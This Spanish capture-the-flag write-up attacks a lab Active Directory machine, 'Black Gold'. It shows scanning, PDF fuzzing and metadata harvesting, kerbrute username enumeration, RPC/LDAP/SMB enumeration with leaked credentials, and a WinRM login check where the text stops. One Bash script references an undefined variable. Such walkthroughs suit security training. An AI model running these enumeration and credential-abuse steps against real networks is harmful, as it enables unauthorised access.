---
title: "Black Gold - TheHackerLabs"
date: 2025-05-14
draft: false
slug: "THL-writeup-blackGold"
excerpt: "Esta es una máquina bastante difícil. Después de analizar los escaneos, iniciamos con la página web activa en el puerto 80, descubriendo que podemos descargar archivos PDF. Una vez descargador, analizamos sus metadatos con exiftool, notando que cada PDF tiene un nombre de usuario, así que aplicamos Fuzzing para comprobar si existen más PDFs, siendo así que descubrimos 188 PDFs. Creamos un script con Python para descargar todos estos PDFs y los analizamos todos con exiftool para obtener todos los nombres de usuarios, con tal de crear un wordlist de usuarios. Enumeramos Kerberos con kerbrute usando este wordlist, descubriendo un usuario válido. Después, analizamos el contenido de cada PDF con pdfgrep y descubrimos la contraseña de este usuario en un PDF. Utilizamos este usuario para enumerar el servicio RCP y LDAP, siendo así que descubrimos un usuario que agregó su contraseña en la descripción de su usuario. Utilizamos este segundo usuario para enumerar el servicio SMB, descubriendo un script de PowerShell que contiene otro usuario y contraseña. Con este último usuario, utilizamos bloodhound-python para obtener la data del AD, y a su vez, nos logueamos a la máquina víctima con evil-winrm. Analizando la data con BloodHound, encontramos que podemos cambiar la contraseña de otro usuario, ya que tenemos el permiso ForceChangePassword. Cambiándole la contraseña a este cuarto usuario y logueándonos con evil-winrm, descubrimos que este usuario tiene el privilegio SeBackupPrivilege, que podemos aprovechar para realizar una copia del archivo ntds.dit y system hive, con tal de poder dumpear sus hashes con impacket-secretsdump. Probando el Hash NTLM del Administrador, descubrimos que no funciona, por lo que decidimos aplicar el Golden Ticket Attack para suplantar al Administrador y poder loguearnos con impacket-psexec, logrando escalar privilegios y convirtiéndonos en Administrador."
categories: ["TheHackerLabs", "Hard Machine"]
tags: ["Windows", "Active Directory", "Kerberos", "SMB", "RPC", "LDAP", "WinRM", "Web Enumeration", "Fuzzing", "Python Automation", "PDF Metadata Analysis", "Kerberos Enumeration", "Information Leakage", "RPC Enumeration", "LDAP Enumeration", "SMB Enumeration", "BloodHound and bloodhound-python Enumeration", "Abusing ForceChangePassword Privilege", "Abusing SeBackupPrivilege Privilege", "Golden Ticket Attack", "Privesc - Golden Ticket Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "wappalizer"
  - "exiftool"
  - "bash"
  - "gobuster"
  - "chmod"
  - "grep"
  - "sed"
  - "cut"
  - "sort"
  - "kerbrute_linux_amd64"
  - "pdfgrep"
  - "crackmapexec"
  - "rpcclient"
  - "netexec"
  - "ldapdomaindump"
  - "Python3"
  - "smbmap"
  - "bloodhound-python"
  - "evil-winrm"
  - "BloodHound"
  - "wget"
  - "PowerView.ps1"
  - "net"
  - "unix2dos"
  - "diskshadow"
  - "robocopy"
  - "reg"
  - "SeBackupPrivilegeCmdLets.dll"
  - "SeBackupPrivilegeUtils.dll"
  - "Copy-FileSebackupPrivilege"
  - "impacket-secretsdump"
  - "impacket-getPac"
  - "impacket-ticketer"
  - "export"
  - "klist"
  - "ntpdate"
  - "nslookup"
  - "impacket-psexec"
links:
  - "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
  - "https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1"
  - "https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/"
  - "https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file"
  - "https://www.picussecurity.com/resource/blog/golden-ticket-attack-mitre-t1558.001"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-blackGold/blackGold.png"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:20 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
...
Nmap scan report for 192.168.56.10
Host is up (0.0011s latency).
...
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.19 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.56.0/24
Interface: eth0, type: EN10MB
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.56.10	XX	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.239 seconds (114.34 hosts/sec). 2 responded
```
Encontramos nuestro objetivo y es: `192.168.56.10`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.56.10
PING 192.168.56.10 (192.168.56.10) 56(84) bytes of data.
64 bytes from 192.168.56.10: icmp_seq=1 ttl=128 time=2.21 ms
64 bytes from 192.168.56.10: icmp_seq=2 ttl=128 time=0.881 ms
64 bytes from 192.168.56.10: icmp_seq=3 ttl=128 time=1.06 ms
64 bytes from 192.168.56.10: icmp_seq=4 ttl=128 time=0.961 ms

--- 192.168.56.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 0.881/1.276/2.205/0.539 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.10 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:23 CST
Initiating ARP Ping Scan at 11:23
Scanning 192.168.56.10 [1 port]
Completed ARP Ping Scan at 11:23, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:23
Scanning 192.168.56.10 [65535 ports]
Discovered open port 135/tcp on 192.168.56.10
Discovered open port 139/tcp on 192.168.56.10
Discovered open port 445/tcp on 192.168.56.10
Discovered open port 80/tcp on 192.168.56.10
Discovered open port 53/tcp on 192.168.56.10
Discovered open port 3268/tcp on 192.168.56.10
Discovered open port 54369/tcp on 192.168.56.10
SYN Stealth Scan Timing: About 53.61% done; ETC: 11:24 (0:00:39 remaining)
Discovered open port 88/tcp on 192.168.56.10
Discovered open port 9389/tcp on 192.168.56.10
Discovered open port 54382/tcp on 192.168.56.10
Discovered open port 49664/tcp on 192.168.56.10
Discovered open port 54366/tcp on 192.168.56.10
Discovered open port 5985/tcp on 192.168.56.10
Discovered open port 593/tcp on 192.168.56.10
Discovered open port 389/tcp on 192.168.56.10
Discovered open port 54368/tcp on 192.168.56.10
Discovered open port 3269/tcp on 192.168.56.10
Discovered open port 54401/tcp on 192.168.56.10
Discovered open port 636/tcp on 192.168.56.10
Discovered open port 464/tcp on 192.168.56.10
Completed SYN Stealth Scan at 11:24, 67.83s elapsed (65535 total ports)
Nmap scan report for 192.168.56.10
Host is up, received arp-response (0.0033s latency).
Scanned at 2025-05-12 11:23:16 CST for 68s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
54366/tcp open  unknown          syn-ack ttl 128
54368/tcp open  unknown          syn-ack ttl 128
54369/tcp open  unknown          syn-ack ttl 128
54382/tcp open  unknown          syn-ack ttl 128
54401/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 68.07 seconds
           Raw packets sent: 131054 (5.766MB) | Rcvd: 143 (26.490KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Podemos ver bastantes puertos activos, entre ellos el **puerto 88** que es del **servicio Kerberos**, lo que nos indica que estamos contra una máquina tipo **Active Directory**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,54366,54368,54369,54382,54401 192.168.56.10 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:26 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.10
Host is up (0.0014s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0

|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title:  Neptune 
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-12 17:26:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
54366/tcp open  msrpc         Microsoft Windows RPC
54368/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54369/tcp open  msrpc         Microsoft Windows RPC
54382/tcp open  msrpc         Microsoft Windows RPC
54401/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-05-12T17:27:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.88 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Se puede ver el dominio de la máquina, siendo **neptune.thl**, que podemos registrar en el `/etc/hosts`:
```bash
nano /etc/hosts
---------------
192.168.56.10 neptune.thl
```
Me da curiosidad que no reportó casi nada del **servicio SMB**, por lo que presiento que será complicado enumerarlo.

Bien, me interesa bastante la página web del **puerto 80**, por lo que empezaremos por ahí.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura1.png">
</p>

Parece una página de una planta petrolera.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura2.png">
</p>

Como tal, no veo algo que nos ayude.

Si bajamos un poco, encontraremos 2 PDFs que podemos descargar y ver:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura3.png">
</p>

Estos son solamente informes y no tienen nada más.

Entra en cada uno y descárgalos:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura4.png">
</p>

De ahí en fuera, no veo algo más de la página que podamos analizar.

Antes de aplicar **Fuzzing**, podemos analizar si los PDFs tienen algo oculto en los metadatos con la herramienta **exiftool**.

### Analizando Metadatos de PDFs {#PDF}

Probemos con cualquiera de los dos para ver qué obtenemos:
```bash
exiftool 2024-02-15.pdf
ExifTool Version Number         : 13.25
File Name                       : 2024-02-15.pdf
Directory                       : .
...
PDF Version                     : 1.7
...
Language                        : es
Title                           : Certificado de Cumplimiento de Normativas Ambientales
Producer                        : pdf-lib (https://github.com/Hopding/pdf-lib)
Modify Date                     : 0000:01:01 00:00:00
Creator                         : Neptune Oil & Gas
Create Date                     : 2024:02:15 04:00:00+01:00
Author                          : James Clear
Subject
```
Me llama la atención que podemos ver el nombre de quien lo creó.

Veamos el otro PDF:
```bash
exiftool 2024-11-29.pdf
ExifTool Version Number         : 13.25
File Name                       : 2024-11-29.pdf
...
Author                          : David Brown
Create Date                     : 2025:02:26 23:07:22+01:00
Creator                         : Neptune Oil & Gas
Modify Date                     : 2025:02:26 23:07:22+01:00
Producer                        : ReportLab PDF Library - www.reportlab.com
Subject                         : Informe sobre sostenibilidad y reducción de emisiones de CO2
Title                           : Informe de Sostenibilidad 2024
...
PDF Version                     : 1.5
```
Parece que la versión del PDF varía, y también vemos otro nombre.

Pensándolo un poco, podríamos tomar estos dos nombres y crear un wordlist de variaciones de usuario para ver si existe alguno registrado en el **servicio Kerberos** con **Kerbrute**.

La cuestión aquí es que, por el formato que tiene el nombre de cada PDF, nos da a entender que existen más PDFs del año 2024 o de otros años.

Vamos a crear un wordlist con distintas fechas del 2020 al 2025, siguiendo el formato que tienen los PDFs y luego aplicaremos **Fuzzing** para ver si existen más.

### Creando Wordlist de Fechas y Aplicando Fuzzing para Descubrir Nuevos PDFs {#fuzz}

Pare crear el wordlist, creamos un script simple de **Bash**:
```bash
#!/bin/bash
inicio="2020-01-01"
fin="2025-12-31"

fechas="$inicio"
while [[ "$fechas" < "$end" ]]; do
    echo "$fechas.pdf"
    fechas=$(date -I -d "$fechas + 1 day")
done > wordlistFechas.txt
```
Este script toma como rango de inicio la fecha `2020-01-01` y como rango final `2025-12-31`. Estos rangos se utilizan dentro de un bucle que estará creando las fechas en cada vuelta, utilizando el comando **date** y a cada fecha se le agrega la extensión `.pdf`.

Cuando termine el bucle, los resultados se guardan en un archivo llamado **wordlistFechas.txt**.

Tan solo tienes que darle permisos de ejecución y ejecutarlo. Puede que tarde un poquito:
```bash
chmod +x datesCreator.sh
-
./datesCreator.sh
-
cat wordlistFechas.txt | wc -l
2191
```
Tenemos 2191 fechas.

Ahora, apliquemos **Fuzzing** al directorio `/docs`:
```bash
gobuster dir -u http://192.168.56.10/docs/ -w wordlistFechas.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.10/docs/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                wordlistFechas.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/2023-01-27.pdf       (Status: 200) [Size: 48362]
/2023-01-25.pdf       (Status: 200) [Size: 47406]
/2023-01-05.pdf       (Status: 200) [Size: 49912]
/2023-01-23.pdf       (Status: 200) [Size: 51050]
...
/2024-03-07.pdf       (Status: 200) [Size: 51799]
Progress: 4382 / 4384 (99.95%)
/2024-11-25.pdf       (Status: 200) [Size: 49008]
===============================================================
Finished
===============================================================
```
Encontramos bastantes archivos, siendo un total de 189 archivos. Además, parece que los archivos son de un rango del 2023 al 2024.

La cuestión aquí es cómo le haremos para descargar todos los PDFs y analizar cada uno.

Toca automatizar esto con **Python**.

### Automatización de Descarga de Multiples Archivos PDF {#Automatizacion}

La idea es, crear un script que utilice la ruta `http://192.168.56.10/docs/` para que descargue todo su contenido, siendo archivos de PDF.

Lo importante, es que sabemos que todos los PDFs son del año 2023 al 2024, por lo que usaremos ese rango para que haga las descargas.
```python
import os
import requests
from datetime import datetime, timedelta

# Variables
inicio = datetime(2023, 1, 1)
fin = datetime(2024, 12, 31)
url_base = "http://192.168.56.10/docs/"

# Creación de directorio donde se guardan PDFs
directorio = "pdfs_descargados"
os.makedirs(directorio, exist_ok=True)

print("Descargando archivos PDF...")

# Busqueda y Descarga
fecha_actual = inicio
while fecha_actual <= fin:
    filename = fecha_actual.strftime("%Y-%m-%d") + ".pdf"
    file_url = url_base + filename
    local_path = os.path.join(directorio, filename)

    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            with open(local_path, "wb") as f:
                f.write(response.content)
    except:
        pass  # Ignorar errores

    fecha_actual += timedelta(days=1)

print("Descarga finalizada.")
```
Explicando la Búsqueda y Descarga:

* Declaramos las variables globales, donde definimos los rangos de fechas y la URL a usar.
* Se crea el directorio **pdfs_descargados**, pues ahí se guardarán los archivos.
* Inicia la variable **fecha_actual** para utilizar el valor de la variable **inicio**, que sería `2023-01-01`. 
* Crea un bucle para tomar los rangos de fechas del año 2023 al 2024.
* Crea las fechas en formato **YYYY-MM-DD** y les agrega la extensión **.pdf** dentro de la variable **filename**.
* La variable **file_url** crea la URL juntando la URL base y el contenido de la variable **filename**, que son las fechas.
* La variable **local-path** genera la ruta local donde se guardará el archivo descargado, por ejemplo, `pdfs_descargados/2023-01-01.pdf`.
* Intenta hacer una **petición GET** a la URL creada y si responde con un **código 200**, se crea un archivo con el nombre correspondiente en modo binario (**wb**) y escribe el contenido descargado en él.
* Si hay algún error, los ignora y continúa.
* En cada vuelta del bucle, se le suma un día actual a la fecha que se está ocupando en la variable **fecha_actual**, hasta que se llegue al rango final del bucle.

Listo, una vez que ejecutes el script, podremos ver el directorio **pdfs_descargados** y veremos **188 PDFs**.

Podemos analizar todos los PDFs con **exiftool** a la vez y aplicamos algunos filtros, para que solamente obtengamos lo que hay en las etiquetas **Author y Creator**:
```bash
exiftool pdfs_descargados/*.pdf | grep -E "Author|Creator" | sort -u | cut -d':' -f2- | grep -v "Neptune Oil & Gas" | sed 's/^ //' | grep -v '^$' > usuarios.txt
```
Todo el resultado lo tenemos en un wordlist que nos sirve como un wordlist de usuarios.

### Enumeración de Servicio Kerberos y Análisis de Contenido de PDFs {#Kerberos}

Vamos a enumerar el **servicio Kerberos** con el wordlist de usuarios que tenemos y la herramienta **kerbrute**:
```bash
./kerbrute_linux_amd64 userenum -d neptune.thl --dc 192.168.56.10 usuarios.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/12/25 - Ronnie Flathers @ropnop

2025/05/12 15:58:12 >  Using KDC(s):
2025/05/12 15:58:12 >  	192.168.56.10:88

2025/05/12 15:58:12 >  [+] VALID USERNAME:	 Lucas.Miller@neptune.thl
2025/05/12 15:58:12 >  Done! Tested 88 usernames (1 valid) in 0.111 seconds
```
Excelente, descubrimos que existe el **usuario Lucas.Miller**.

Antes de continuar, nos falta analizar el contenido de los PDF con tal de buscar alguna pista o quizá una contraseña.

Pero nos tardaremos mucho si lo hacemos uno por uno.

Por esto, usaremos la herramienta **pdfgrep** que puede analizar el contenido de cualquier PDF.

La puedes instalar de esta forma:
```bash
apt install pdfgrep
```

Y tan solo tenemos qué indicar que es lo que buscamos, por ejemplo, la palabra **contraseña**:
```bash
pdfgrep -i "contraseña" pdfs_descargados/*.pdf
pdfs_descargados/2023-01-12.pdf:   ●​ Contraseña temporal: ************ (Por favor, cambia esta
pdfs_descargados/2023-01-12.pdf:      contraseña en tu primer inicio de sesión)
```

Muy bien, tenemos una contraseña y el PDF que la contiene:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura5.png">
</p>

Con lo que tenemos, podemos comprobar si la contraseña sirve contra el **usuario Lucas.Miller** con **crackmapexec**:
```bash
crackmapexec smb 192.168.56.10 -u 'Lucas.Miller' -p '**************'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [+] neptune.thl\Lucas.Miller:********
```
Genial, podemos seguir con el **servicio SMB**.

Y como no habíamos analizado antes el **SMB**, podemos ver el nombre del servidor del DC, así que registralo en el `/etc/hosts`:
```bash
nano /etc/hosts
--------------
192.168.56.10 neptune.thl DC01.neptune.thl
```
Listo, continuemos.

## Explotación de Vulnerabilidades {#Explotacion}

### Enumeración de Servicio RPC {#RPC}

Tengo entendido que nos podemos autenticar en **SMB y RPC** con las mismas credenciales, ya que ambos trabajan de la mano.

Comprobémoslo entrando al **servicio RPC** con la herramienta **rpcclient**:
```batch
rpcclient -U "Lucas.Miller%contraseña_aqui" 192.168.56.10
rpcclient $>
```
Estamos dentro.

Desde aquí, podemos enumerar los usuarios, grupos y demás información.

Veamos los usuarios existentes:
```batch
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lucas.miller] rid:[0x451]
user:[victor.rodriguez] rid:[0x452]
user:[emma.johnson] rid:[0x453]
user:[thomas.brown] rid:[0x454]
```
Tenemos 4 usuarios.

Veamos los grupos existentes:
```batch
pcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44f]
group:[IT] rid:[0x455]
```
Ese **grupo TI** parece que fue creado por un usuario.

Veamos la descripción de los usuarios porque puede haber alguna pista ahí:
```batch
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: emma.johnson	Name: Emma Johnson	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf11 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: lucas.miller	Name: Lucas Miller	Desc: (null)
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: thomas.brown	Name: Thomas Brown	Desc: (null)
index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: victor.rodriguez	Name: Victor Rodriguez	Desc: My Password is *******
```
Genial, parece que el **usuario victor.rodriguez** dejó su contraseña en la descripción de su usuario.

Comprobemos que funciona con **crackmapexec**:
```bash
crackmapexec smb 192.168.56.10 -u 'victor.rodriguez' -p '********'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [+] neptune.thl\victor.rodriguez:*********
```
Sí funciona esta contraseña.

Antes de ir al **SMB**, apliquemos enumeración al **servicio LDAP**.

### Enumeración de Servicio LDAP {#LDAP}

Al aplicar esta enumeración, podemos ver, de manera más gráfica, la información del dominio, como los grupos y usuarios existentes.

Podemos probar la contraseña de cualquier usuario que tenemos, para ver si funcionan contra el **servicio LDAP** con la herramienta **netexec**:
```bash
netexec ldap 192.168.56.10 -u 'lucas.miller' -p '************'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.10   389    DC01             [+] neptune.thl\lucas.miller:**********
.
netexec ldap 192.168.56.10 -u 'victor.rodriguez' -p '************'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.10   389    DC01             [+] neptune.thl\victor.rodriguez:************
```
Ambos funcionan.

La idea es que vamos a descargar todo el contenido del **servicio LDAP** para poder analizarlo desde nuestro navegador.

Primero descarguemos el contenido con la herramienta **ldapdomaingroup** dentro de un directorio:
```bash
mkdir LDAP
cd LDAP
.
ldapdomaindump -u 'neptune.thl\Lucas.Miller' -p '***********' 192.168.56.10
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Bien, levanta un servidor con **Python** para que podamos visualizar el contenido:
```bash
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Con esto, ya podemos visitar lo que descargamos, siendo que son los archivos **.html** los que debemos ver:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura6.png">
</p>

Revisemos el archivo **domain_users.html**:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura7.png">
</p>

Vemos claramente los usuarios y a qué grupos pertenecen.

Ahí está el usuario **victor.rodriguez** que pertenece al **grupo IT**. Vemos otros dos usuarios que también pertenecen a este grupo y al **grupo Remote Management Users** al que podemos entrar con la herramienta **evil-winrm**.

### Enumeración de Servicio SMB y Ganando Acceso a la Máquina Víctima {#SMB}

Veamos qué podemos encontrar con las credenciales del nuevo usuario que encontramos:
```bash
smbmap -H 192.168.56.10 -u 'victor.rodriguez' -p '*************'
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
.
[+] IP: 192.168.56.10:445	Name: neptune.thl         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections
```
Bien, tenemos permiso de lectura al **directorio IT**.

Revisando su contenido, encontramos un script de **PowerShell** que tiene un nombre bastante peculiar:
```bash
smbmap -H 192.168.56.10 -u 'victor.rodriguez' -p '***********' -r IT/Scripts --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.56.10:445	Name: neptune.thl         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	./ITScripts
	dr--r--r--                0 Thu Feb 27 12:38:34 2025	.
	dr--r--r--                0 Thu Feb 27 12:38:34 2025	..
	fr--r--r--             1957 Thu Feb 27 12:38:34 2025	backup.ps1
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
[*] Closed 1 connections
```

Vamos a descargarlo:
```bash
smbmap -H 192.168.56.10 -u 'victor.rodriguez' -p '***********' --download IT/Scripts/backup.ps1 --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] Starting download: IT\Scripts\backup.ps1 (1957 bytes)                                                                
[+] File output to: /../TheHackersLabs/BlackGold/content/192.168.56.10-IT_Scripts_backup.ps1
[*] Closed 1 connections
```

Y revisando su contenido, encontraremos las credenciales de otro usuario:
```powershell
$sourceDirectory = "C:\Confidenciales"
$destinationDirectory = "E:\Backups\Confidenciales"

$username = "emma.johnson"
$password = ConvertTo-SecureString "contraseña_emma.johnson" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)

$emailFrom = "emma.johnson@neptune.thl"
$emailTo = "emma.johnson@neptune.thl"
$smtpServer = "smtp.neptune.thl"
$smtpPort = 587
$emailSubject = "Notificación de Backup Completo"
...
...
```
Si recordamos, ese usuario pertenece al **grupo Remote Maganement Users**.

Comprobemos si podemos usar estas credenciales para entrar a la máquina víctima con la herramienta **evil-winrm**:
```bash
crackmapexec winrm 192.168.56.10 -u 'emma.johnson' -p '************'
SMB         192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
